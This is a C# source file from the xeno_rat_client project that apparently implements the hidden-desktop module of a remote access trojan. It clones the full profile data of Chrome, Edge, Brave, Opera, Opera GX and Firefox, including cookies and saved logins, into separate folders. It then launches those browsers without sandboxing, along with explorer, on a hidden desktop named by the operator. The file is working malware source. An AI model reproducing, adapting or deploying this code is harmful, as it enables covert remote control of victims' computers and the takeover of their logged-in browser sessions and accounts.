using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Hidden_handler
{
    class Process_Handler
    {
        string DesktopName;
        public Process_Handler(string DesktopName) 
        {
            this.DesktopName = DesktopName;
        }

        /// <summary>
        /// Creates a new process and its primary thread. The new process runs in the security context of the calling process.
        /// </summary>
        /// <param name="lpApplicationName">The name of the module to be executed.</param>
        /// <param name="lpCommandLine">The command line to be executed.</param>
        /// <param name="lpProcessAttributes">A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes.</param>
        /// <param name="lpThreadAttributes">A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes.</param>
        /// <param name="bInheritHandles">If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. If the parameter is FALSE, the handles are not inherited.</param>
        /// <param name="dwCreationFlags">The flags that control the priority class and the creation of the process.</param>
        /// <param name="lpEnvironment">A pointer to an environment block for the new process.</param>
        /// <param name="lpCurrentDirectory">The full path to the current directory for the process.</param>
        /// <param name="lpStartupInfo">A pointer to a STARTUPINFO or STARTUPINFOEX structure.</param>
        /// <param name="lpProcessInformation">A pointer to a PROCESS_INFORMATION structure that receives identification information about the new process.</param>
        /// <returns>True if the function succeeds, otherwise false. To get extended error information, call GetLastError.</returns>
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
         string lpApplicationName,
         string lpCommandLine,
         IntPtr lpProcessAttributes,
         IntPtr lpThreadAttributes,
         bool bInheritHandles,
         int dwCreationFlags,
         IntPtr lpEnvironment,
         string lpCurrentDirectory,
         ref STARTUPINFO lpStartupInfo,
         ref PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        /// <summary>
        /// Starts the Windows Explorer process and returns a boolean indicating success.
        /// </summary>
        /// <returns>True if the Windows Explorer process was successfully started; otherwise, false.</returns>
        /// <remarks>
        /// This method modifies the Windows registry to set a specific value to prevent combining taskbar buttons.
        /// It then attempts to start the Windows Explorer process either as an admin or restricted user.
        /// If successful, it returns true; otherwise, it attempts to start the Windows Explorer process and returns the result.
        /// </remarks>
        public bool StartExplorer() 
        {
            uint neverCombine = 2;
            string valueName = "TaskbarGlomLevel";
            string explorerKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(explorerKeyPath, true))
            {
                if (key != null)
                {
                    object value = key.GetValue(valueName);
                    if (value is uint regValue && regValue != neverCombine)
                    {
                        key.SetValue(valueName, neverCombine, RegistryValueKind.DWord);
                    }
                }
            }
            if (Utils.IsAdmin())
            {
                if (_ProcessHelper.RunAsRestrictedUser(@"C:\Windows\explorer.exe", DesktopName)) 
                {
                    return true;
                }
            }
            return CreateProc(@"C:\Windows\explorer.exe");
        }

        /// <summary>
        /// Retrieves the installation path of the Opera browser.
        /// </summary>
        /// <returns>The installation path of the Opera browser, or null if it is not found.</returns>
        /// <remarks>
        /// This method retrieves the installation path of the Opera browser by searching the Windows Registry under the path "SOFTWARE\Clients\StartMenuInternet".
        /// It iterates through the subkeys to find the one related to Opera (excluding Opera GX) and retrieves the installation path from the registry key "shell\open\command".
        /// If the installation path is found, it is returned after trimming any surrounding double quotes. If not found, null is returned.
        /// </remarks>
        public string GetOperaPath()
        {
            const string basePath = @"SOFTWARE\Clients\StartMenuInternet";
            using (var clientsKey = Registry.CurrentUser.OpenSubKey(basePath))
            {
                if (clientsKey != null)
                {
                    foreach (var subKeyName in clientsKey.GetSubKeyNames())
                    {
                        if (subKeyName.Contains("Opera") && !subKeyName.Contains("GX"))
                        {
                            using (var operaKey = clientsKey.OpenSubKey($"{subKeyName}\\shell\\open\\command"))
                            {
                                if (operaKey != null)
                                {
                                    object operaPathObj = operaKey.GetValue("");
                                    if (operaPathObj != null)
                                    {
                                        return operaPathObj.ToString().Trim('"');
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return null;
        }

        /// <summary>
        /// Retrieves the installation path of the Brave browser.
        /// </summary>
        /// <returns>The installation path of the Brave browser, or null if the path is not found.</returns>
        /// <remarks>
        /// This method retrieves the installation path of the Brave browser by accessing the Windows Registry.
        /// It first attempts to retrieve the path from the registry key "HKEY_CLASSES_ROOT\BraveHTML\shell\open\command".
        /// If the path is found, it is then parsed to extract the installation path.
        /// The method returns the installation path if found, otherwise it returns null.
        /// </remarks>
        public string GetBravePath()
        {
            var path = Registry.GetValue(@"HKEY_CLASSES_ROOT\BraveHTML\shell\open\command", null, null) as string;
            if (path != null)
            {
                var split = path.Split('\"');
                path = split.Length >= 2 ? split[1] : null;
            }
            return path;
        }

        /// <summary>
        /// Retrieves the installation path of Opera GX browser from the Windows registry.
        /// </summary>
        /// <returns>The installation path of Opera GX browser, or null if it is not found.</returns>
        /// <remarks>
        /// This method retrieves the installation path of Opera GX browser by accessing the Windows registry.
        /// It first looks for the relevant registry keys under the path SOFTWARE\Clients\StartMenuInternet, and then iterates through the subkeys to find the one related to Opera GX.
        /// Once the appropriate subkey is found, it accesses the command subkey to retrieve the installation path of Opera GX browser.
        /// The method returns the installation path as a string, or null if it is not found.
        /// </remarks>
        public string GetOperaGXPath()
        {
            const string basePath = @"SOFTWARE\Clients\StartMenuInternet";
            using (var clientsKey = Registry.CurrentUser.OpenSubKey(basePath))
            {
                if (clientsKey != null)
                {
                    foreach (var subKeyName in clientsKey.GetSubKeyNames())
                    {
                        if (subKeyName.Contains("Opera") && subKeyName.Contains("GX"))
                        {
                            using (var operaGXKey = clientsKey.OpenSubKey($"{subKeyName}\\shell\\open\\command"))
                            {
                                if (operaGXKey != null)
                                {
                                    object operaGXPathObj = operaGXKey.GetValue("");
                                    if (operaGXPathObj != null)
                                    {
                                        return operaGXPathObj.ToString().Trim('"');
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return null;
        }

        /// <summary>
        /// Retrieves the file path for the installed Chrome browser.
        /// </summary>
        /// <returns>The file path for the installed Chrome browser, or null if the path is not found.</returns>
        /// <remarks>
        /// This method retrieves the file path for the installed Chrome browser by accessing the Windows Registry and extracting the path from the registry key "HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command".
        /// If the path is found, it is split using the double quotes character and the second element is returned as the file path. If the path is not found, null is returned.
        /// </remarks>
        public string getChromePath()
        {

            var path = Registry.GetValue(@"HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command", null, null) as string;
            if (path != null)
            {
                var split = path.Split('\"');
                path = split.Length >= 2 ? split[1] : null;
            }
            return path;
        }

        /// <summary>
        /// Retrieves the installation path of Microsoft Edge browser.
        /// </summary>
        /// <returns>
        /// The installation path of Microsoft Edge browser, or null if the browser is not installed.
        /// </returns>
        /// <remarks>
        /// This method retrieves the installation path of Microsoft Edge browser by accessing the registry key at the specified location.
        /// If the registry key is found and contains a valid path, it returns the installation path as a string.
        /// If the registry key is not found or does not contain a valid path, it returns null.
        /// </remarks>
        public string GetEdgePath()
        {
            string edgeRegistryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe";

            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(edgeRegistryPath))
            {
                if (key != null)
                {
                    object edgePathObj = key.GetValue("");

                    if (edgePathObj != null)
                    {
                        return edgePathObj.ToString();
                    }
                }
            }

            return null;
        }

        /// <summary>
        /// Retrieves the installation path of Mozilla Firefox from the Windows registry.
        /// </summary>
        /// <returns>The installation path of Mozilla Firefox if found; otherwise, null.</returns>
        /// <remarks>
        /// This method retrieves the installation path of Mozilla Firefox by accessing the Windows registry.
        /// It first looks for the current version of Firefox, then retrieves the installation path from the registry.
        /// If the installation path is found, it is returned; otherwise, null is returned.
        /// </remarks>
        public string GetFirefoxPath()
        {
            string firefoxRegistryPath = @"SOFTWARE\Mozilla\Mozilla Firefox";

            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(firefoxRegistryPath))
            {
                if (key != null)
                {
                    object firefoxPathObj = key.GetValue("CurrentVersion");

                    if (firefoxPathObj != null)
                    {
                        string currentVersion = firefoxPathObj.ToString();
                        string pathKey = $@"SOFTWARE\Mozilla\Mozilla Firefox\{currentVersion}\Main";

                        using (RegistryKey pathSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(pathKey))
                        {
                            if (pathSubKey != null)
                            {
                                object pathValue = pathSubKey.GetValue("PathToExe");

                                if (pathValue != null)
                                {
                                    return pathValue.ToString();
                                }
                            }
                        }
                    }
                }
            }
            return null;
        }

        /// <summary>
        /// Starts the Chrome browser with specified options and user data directory.
        /// </summary>
        /// <returns>True if Chrome is successfully started; otherwise, false.</returns>
        /// <remarks>
        /// This method starts the Chrome browser with the specified options and user data directory.
        /// It first checks for the existence of the Chrome executable at the path obtained from <see cref="getChromePath"/> method.
        /// If the path is null or the file does not exist, the method returns false.
        /// Otherwise, it creates a process to start Chrome with the specified options and user data directory.
        /// </remarks>
        public bool StartChrome() 
        {
            string dataDir = @"C:\ChromeAutomationData";
            string path = getChromePath();
            if (path == null || !File.Exists(path)) 
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir="+dataDir);
        }

        /// <summary>
        /// Starts the Opera browser with specified settings and user data directory.
        /// </summary>
        /// <returns>True if the Opera browser is successfully started; otherwise, false.</returns>
        /// <remarks>
        /// This method retrieves the path of the Opera browser executable and checks if it exists. If the path is not found or the file does not exist, the method returns false.
        /// If the path is valid and the file exists, the method creates a new process for the Opera browser with specified settings and user data directory.
        /// </remarks>
        public bool StartOpera()
        {
            string dataDir = @"C:\OperaAutomationData";
            string path = GetOperaPath();
            if (path == null || !File.Exists(path))
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
        }

        /// <summary>
        /// Starts the Opera GX browser with specific configurations.
        /// </summary>
        /// <returns>True if the Opera GX browser is started successfully; otherwise, false.</returns>
        /// <remarks>
        /// This method starts the Opera GX browser with specific configurations, including disabling GPU, setting the user data directory, and other options.
        /// If the path to the Opera GX executable is not found or the file does not exist, the method returns false.
        /// </remarks>
        public bool StartOperaGX()
        {
            string dataDir = @"C:\OperaGXAutomationData";
            string path = GetOperaGXPath();
            if (path == null || !File.Exists(path))
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
        }

        /// <summary>
        /// Starts the Brave browser with specified settings.
        /// </summary>
        /// <returns>True if the Brave browser is successfully started; otherwise, false.</returns>
        /// <remarks>
        /// This method starts the Brave browser with the specified settings. It first checks for the existence of the Brave browser executable at the path obtained from <see cref="GetBravePath"/> method.
        /// If the path is null or the file does not exist, the method returns false.
        /// Otherwise, it creates a new process with the specified command-line arguments to start the Brave browser and returns true if the process is successfully created; otherwise, false.
        /// </remarks>
        public bool StartBrave()
        {
            string dataDir = @"C:\BraveAutomationData";
            string path = GetBravePath();
            if (path == null || !File.Exists(path))
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
        }

        /// <summary>
        /// Starts the Edge browser with specific configurations and user data directory.
        /// </summary>
        /// <returns>True if the Edge browser is successfully started; otherwise, false.</returns>
        /// <remarks>
        /// This method retrieves the path for the Edge browser, and if the path is valid and the file exists, it creates a process to start the Edge browser with specific configurations such as no-sandbox, allow-no-sandbox-job, disable-gpu, and a user data directory.
        /// If the path is null or the file does not exist, the method returns false.
        /// </remarks>
        public bool StartEdge()
        {
            string dataDir = @"C:\EdgeAutomationData";
            string path = GetEdgePath();
            if (path == null || !File.Exists(path))
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
        }

        /// <summary>
        /// Starts the Firefox browser with a specific profile and returns a boolean indicating success.
        /// </summary>
        /// <returns>True if the Firefox browser is successfully started; otherwise, false.</returns>
        /// <remarks>
        /// This method retrieves the path of the Firefox executable and the data directory for the Firefox profile.
        /// If the path is not found or the file does not exist, the method returns false.
        /// Otherwise, it creates a new process to start the Firefox browser with the specified profile and returns true upon successful start.
        /// </remarks>
        public bool StartFirefox()
        {
            string dataDir = @"C:\FirefoxAutomationData";
            string path = GetFirefoxPath();
            if (path == null || !File.Exists(path))
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " -no-remote -profile " + dataDir);
        }

        /// <summary>
        /// Clones the Chrome user data directory to a specified location.
        /// </summary>
        /// <returns>True if the cloning operation is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method asynchronously clones the Chrome user data directory to the specified location.
        /// It first checks if the destination directory exists, and if so, deletes it and creates a new one.
        /// Then it copies all the contents from the source directory to the destination directory.
        /// If any exception occurs during the cloning process, the method returns false.
        /// </remarks>
        public async Task<bool> CloneChrome()
        {
            try
            {
                string dataDir = @"C:\ChromeAutomationData";
                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Google\Chrome\User Data";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        /// <summary>
        /// Clones the Opera GX browser data to a specified directory.
        /// </summary>
        /// <returns>True if the cloning operation is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method asynchronously clones the data directory of the Opera GX browser to the specified location.
        /// If the target directory already exists, it will be deleted and recreated before the cloning operation.
        /// </remarks>
        public async Task<bool> CloneOperaGX()
        {
            try
            {
                string dataDir = @"C:\OperaGXAutomationData";
                string source = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Opera Software\Opera GX Stable";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        /// <summary>
        /// Clones the Opera browser data to a specified directory.
        /// </summary>
        /// <returns>True if the cloning operation is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method asynchronously clones the Opera browser data from the default location to the specified directory.
        /// If the specified directory already exists, it will be deleted and recreated to ensure a clean copy.
        /// </remarks>
        public async Task<bool> CloneOpera()
        {
            try
            {
                string dataDir = @"C:\OperaAutomationData";
                string source = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Opera Software\Opera Stable";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        /// <summary>
        /// Clones the Brave browser data to a specified directory.
        /// </summary>
        /// <returns>True if the cloning process is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method asynchronously clones the data from the Brave browser's user directory to the specified data directory.
        /// If the specified data directory already exists, it is deleted and recreated before the cloning process.
        /// The method returns true if the cloning process is successful; otherwise, it returns false.
        /// </remarks>
        public async Task<bool> CloneBrave()
        {
            try
            {
                string dataDir = @"C:\BraveAutomationData";
                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\BraveSoftware\Brave-Browser\User Data";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false; 
        }

        /// <summary>
        /// Clones the Firefox profile data to a specified directory.
        /// </summary>
        /// <returns>True if the cloning process is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method searches for the Firefox profile directory in the user's AppData folder and clones the profile data to a specified directory.
        /// If the profile directory is not found or the cloning process fails, the method returns false.
        /// The method uses asynchronous operations to perform file and directory manipulations.
        /// </remarks>
        public async Task<bool> CloneFirefox()
        {
            try
            {
                string profilesPath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Mozilla\Firefox\Profiles";
                string fileInDirectory = "addons.json";
                string source = RecursiveFileSearch(profilesPath, fileInDirectory);
                if (source == null)
                {
                    return false;
                }
                string dataDir = @"C:\FirefoxAutomationData";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        /// <summary>
        /// Clones the Microsoft Edge user data to a specified directory.
        /// </summary>
        /// <returns>True if the cloning operation is successful; otherwise, false.</returns>
        /// <exception cref="Exception">Thrown when an error occurs during the cloning process.</exception>
        public async Task<bool> CloneEdge()
        {
            try
            {
                string dataDir = @"C:\EdgeAutomationData";
                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Microsoft\Edge\User Data";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        /// <summary>
        /// Recursively searches for a file with the specified name in the given directory and its subdirectories.
        /// </summary>
        /// <param name="currentDirectory">The current directory to start the search from.</param>
        /// <param name="targetFileName">The name of the file to search for.</param>
        /// <returns>The path of the directory containing the file with the specified name, or null if the file is not found.</returns>
        /// <remarks>
        /// This method recursively searches for the file with the specified name in the given directory and its subdirectories.
        /// If the file is found, the method returns the path of the directory containing the file.
        /// If the file is not found, the method returns null.
        /// </remarks>
        static string RecursiveFileSearch(string currentDirectory, string targetFileName)
        {
            string targetFilePath = Path.Combine(currentDirectory, targetFileName);
            if (File.Exists(targetFilePath))
            {
                return currentDirectory;
            }
            foreach (string subdirectory in Directory.GetDirectories(currentDirectory))
            {
                string result = RecursiveFileSearch(subdirectory, targetFileName);
                if (result != null)
                {
                    return result;
                }
            }
            return null;
        }

        /// <summary>
        /// Asynchronously copies all directories and files from the source directory to the destination directory.
        /// </summary>
        /// <param name="sourceDir">The source directory to copy from.</param>
        /// <param name="destinationDir">The destination directory to copy to.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method first copies all directories from the source directory to the destination directory using an asynchronous operation.
        /// Then, it enumerates all files in the source directory and its subdirectories, and asynchronously copies them to the destination directory in parallel with a specified maximum parallelism limit.
        /// </remarks>
        public async Task CopyDirAsync(string sourceDir, string destinationDir)
        {
            await CopyDirectoriesAsync(sourceDir, destinationDir);

            IEnumerable<string> files = Directory.EnumerateFiles(sourceDir, "*", SearchOption.AllDirectories);
            await CopyFilesInParallelAsync(files, sourceDir, destinationDir, maxParallelism: 10); // Set your desired parallelism limit
        }

        /// <summary>
        /// Copies all directories from the source directory to the destination directory asynchronously.
        /// </summary>
        /// <param name="sourceDir">The source directory from which directories will be copied.</param>
        /// <param name="destinationDir">The destination directory to which directories will be copied.</param>
        /// <remarks>
        /// This method asynchronously enumerates all directories in the <paramref name="sourceDir"/> and its subdirectories.
        /// For each directory found, it creates a corresponding directory in the <paramref name="destinationDir"/>.
        /// The relative path of each directory in the source directory is used to create the corresponding directory in the destination directory.
        /// </remarks>
        private async Task CopyDirectoriesAsync(string sourceDir, string destinationDir)
        {
            IEnumerable<string> directories = Directory.EnumerateDirectories(sourceDir, "*", SearchOption.AllDirectories);

            foreach (string dir in directories)
            {
                string relativePath = dir.Substring(sourceDir.Length + 1);
                string destinationPath = Path.Combine(destinationDir, relativePath);

                await Task.Run(() => Directory.CreateDirectory(destinationPath));
            }
        }

        /// <summary>
        /// Copies files from the source directory to the destination directory in parallel using the specified maximum parallelism.
        /// </summary>
        /// <param name="files">The collection of file paths to be copied.</param>
        /// <param name="sourceDir">The source directory from which the files are to be copied.</param>
        /// <param name="destinationDir">The destination directory to which the files are to be copied.</param>
        /// <param name="maxParallelism">The maximum number of parallel copy operations allowed.</param>
        /// <exception cref="ArgumentNullException">Thrown when any of the input parameters is null.</exception>
        /// <exception cref="ArgumentException">Thrown when the source or destination directory is invalid.</exception>
        /// <exception cref="IOException">Thrown when an I/O error occurs during file copy operation.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously copies the files from the source directory to the destination directory using parallel copy tasks.
        /// It creates a semaphore to control the maximum parallelism and ensures that the maximum number of parallel copy operations is not exceeded.
        /// Each file is copied asynchronously using <see cref="File.Copy(string, string, bool)"/> method within a try-finally block to release the semaphore.
        /// The method returns a task representing the asynchronous operation of copying all files in parallel.
        /// </remarks>
        private static async Task CopyFilesInParallelAsync(IEnumerable<string> files, string sourceDir, string destinationDir, int maxParallelism)
        {
            var semaphore = new SemaphoreSlim(maxParallelism);

            async Task CopyFileAsync(string filePath)
            {
                string relativePath = filePath.Substring(sourceDir.Length + 1);
                string destinationPath = Path.Combine(destinationDir, relativePath);

                try
                {
                    await semaphore.WaitAsync();
                    await Task.Run(() => File.Copy(filePath, destinationPath, true));
                }
                finally
                {
                    semaphore.Release();
                }
            }

            var copyTasks = files.Select(CopyFileAsync).ToArray();

            await Task.WhenAll(copyTasks);
        }

        /// <summary>
        /// Creates a new process using the specified file path.
        /// </summary>
        /// <param name="filePath">The path of the file to be executed as a new process.</param>
        /// <returns>True if the process creation is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method creates a new process using the file specified by <paramref name="filePath"/>.
        /// It initializes the STARTUPINFO structure <paramref name="si"/> and the PROCESS_INFORMATION structure <paramref name="pi"/>.
        /// The function returns true if the process creation is successful; otherwise, it returns false.
        /// </remarks>
        public bool CreateProc(string filePath)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = DesktopName;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool resultCreateProcess = CreateProcess(
                null,
                filePath,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                48,
                IntPtr.Zero,
                null,
                ref si,
                ref pi);
            return resultCreateProcess;
        }
    }
    class _ProcessHelper
    {

        /// <summary>
        /// Runs the specified file as a restricted user in a separate desktop session.
        /// </summary>
        /// <param name="fileName">The path of the file to be executed.</param>
        /// <param name="DesktopName">The name of the desktop session in which the file should be executed.</param>
        /// <exception cref="ArgumentException">Thrown when <paramref name="fileName"/> is null or whitespace.</exception>
        /// <returns>True if the file was successfully executed as a restricted user; otherwise, false.</returns>
        /// <remarks>
        /// This method attempts to run the specified file as a restricted user in a separate desktop session.
        /// It first checks if the <paramref name="fileName"/> is valid, and then obtains the restricted user token using the GetRestrictedSessionUserToken method.
        /// It then creates a new process using the CreateProcessAsUser method, passing in the restricted user token and other necessary parameters.
        /// If successful, it returns true; otherwise, it returns false.
        /// The method ensures that the restricted user token is properly closed after execution using the CloseHandle method.
        /// </remarks>
        public static bool RunAsRestrictedUser(string fileName, string DesktopName)
        {
            if (string.IsNullOrWhiteSpace(fileName))
                throw new ArgumentException("Value cannot be null or whitespace.", nameof(fileName));

            if (!GetRestrictedSessionUserToken(out var hRestrictedToken))
            {
                return false;
            }

            try
            {
                var si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = DesktopName;
                var pi = new PROCESS_INFORMATION();
                var cmd = new StringBuilder();
                cmd.Append(fileName);

                if (!CreateProcessAsUser(
                    hRestrictedToken,
                    null,
                    cmd,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,
                    0,
                    IntPtr.Zero,
                    Path.GetDirectoryName(fileName),
                    ref si,
                    out pi))
                {
                    return false;
                }

                return true;
            }
            finally
            {
                CloseHandle(hRestrictedToken);
            }
        }

        /// <summary>
        /// Retrieves a restricted session user token and returns it.
        /// </summary>
        /// <param name="token">When this method returns, contains the restricted session user token if the method succeeded, or IntPtr.Zero if the method failed.</param>
        /// <returns>True if the restricted session user token was successfully retrieved; otherwise, false.</returns>
        /// <remarks>
        /// This method retrieves a restricted session user token by creating a Safer level with NormalUser scope and opening it.
        /// It then computes a token from the Safer level and sets the integrity level to "S-1-16-8192".
        /// The retrieved token is stored in the <paramref name="token"/> parameter.
        /// </remarks>
        private static bool GetRestrictedSessionUserToken(out IntPtr token)
        {
            token = IntPtr.Zero;
            if (!SaferCreateLevel(SaferScope.User, SaferLevel.NormalUser, SaferOpenFlags.Open, out var hLevel, IntPtr.Zero))
            {
                return false;
            }

            IntPtr hRestrictedToken = IntPtr.Zero;
            TOKEN_MANDATORY_LABEL tml = default;
            tml.Label.Sid = IntPtr.Zero;
            IntPtr tmlPtr = IntPtr.Zero;

            try
            {
                if (!SaferComputeTokenFromLevel(hLevel, IntPtr.Zero, out hRestrictedToken, 0, IntPtr.Zero))
                {
                    return false;
                }
                tml.Label.Attributes = SE_GROUP_INTEGRITY;
                tml.Label.Sid = IntPtr.Zero;
                if (!ConvertStringSidToSid("S-1-16-8192", out tml.Label.Sid))
                {
                    return false;
                }

                tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
                Marshal.StructureToPtr(tml, tmlPtr, false);
                if (!SetTokenInformation(hRestrictedToken,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    tmlPtr, (uint)Marshal.SizeOf(tml)))
                {
                    return false;
                }

                token = hRestrictedToken;
                hRestrictedToken = IntPtr.Zero;
            }
            finally
            {
                SaferCloseLevel(hLevel);
                SafeCloseHandle(hRestrictedToken);
                if (tml.Label.Sid != IntPtr.Zero)
                {
                    LocalFree(tml.Label.Sid);
                }
                if (tmlPtr != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(tmlPtr);
                }
            }

            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        public enum SaferLevel : uint
        {
            Disallowed = 0,
            Untrusted = 0x1000,
            Constrained = 0x10000,
            NormalUser = 0x20000,
            FullyTrusted = 0x40000
        }

        public enum SaferScope : uint
        {
            Machine = 1,
            User = 2
        }

        [Flags]
        public enum SaferOpenFlags : uint
        {
            Open = 1
        }

        /// <summary>
        /// Creates a new Safer level and returns a handle to the level.
        /// </summary>
        /// <param name="scope">The scope of the Safer level.</param>
        /// <param name="level">The Safer level to be created.</param>
        /// <param name="openFlags">Flags that control the behavior of the Safer level.</param>
        /// <param name="pLevelHandle">When this method returns, contains a pointer to the handle of the newly created Safer level.</param>
        /// <param name="lpReserved">Reserved for future use; must be null.</param>
        /// <returns><c>true</c> if the Safer level was successfully created; otherwise, <c>false</c>.</returns>
        [DllImport("advapi32", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        private static extern bool SaferCreateLevel(SaferScope scope, SaferLevel level, SaferOpenFlags openFlags, out IntPtr pLevelHandle, IntPtr lpReserved);

        /// <summary>
        /// Computes a token from the specified level handle and input access token, and returns the result.
        /// </summary>
        /// <param name="LevelHandle">The handle to the level.</param>
        /// <param name="InAccessToken">The input access token.</param>
        /// <param name="OutAccessToken">When this method returns, contains the computed token if the call to the method succeeded, or IntPtr.Zero if the call failed.</param>
        /// <param name="dwFlags">Flags that control the behavior of the function.</param>
        /// <param name="lpReserved">Reserved for future use; must be IntPtr.Zero.</param>
        /// <returns>True if the method succeeds; otherwise, false.</returns>
        /// <exception cref="System.EntryPointNotFoundException">The specified entry point in the unmanaged DLL is not found.</exception>
        [DllImport("advapi32", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        private static extern bool SaferComputeTokenFromLevel(IntPtr LevelHandle, IntPtr InAccessToken, out IntPtr OutAccessToken, int dwFlags, IntPtr lpReserved);

        /// <summary>
        /// Closes a SAFER level handle.
        /// </summary>
